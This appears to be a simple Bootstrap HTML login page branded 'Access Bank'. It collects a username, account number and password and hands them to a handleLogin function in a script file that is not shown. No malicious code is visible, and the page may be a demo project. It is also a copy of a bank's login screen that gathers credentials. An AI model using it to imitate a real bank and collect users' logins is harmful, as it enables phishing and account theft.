<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login | Access Bank</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"/>
  
  <link rel="stylesheet" href="style.css" />
  
</head>

<body class="d-flex align-items-center justify-content-center login-body" style="min-height: 100vh;">
        
  <div class="login-container shadow-lg rounded p-4 bg-white" style="max-width: 400px; width: 100%;">
          
    <div class="text-center mb-4">
            
      <img src="./ae11d941b42dd0c29c87e19fdf77f0bf.jpg" class="logo-sm" alt="Access Bank" style="max-width: 120px;" />
      
      <h3 class="mt-2">Access Bank Login</h3>
      
    </div>
    
    <form onsubmit="return handleLogin(event)">
            
      <div class="mb-3">
              
        <label for="userName" class="form-label">Username</label>
        
        <input type="text" id="userName" class="form-control" required />
        
      </div>
      
      <div class="mb-3">
              
        <label for="accountNumber" class="form-label">Account Number</label>
        
        <input type="text" id="accountNumber" class="form-control" required />
        
      </div>
      
      <div class="mb-3">
              
        <label for="password" class="form-label">Password</label>
        
        <input type="password" id="password" class="form-control" required />
        
      </div>
      
      <button type="submit" class="btn btn-primary w-100">Login</button>
      
    </form>
    
  </div>

  <script src="script.js"></script>
</body>
</html>
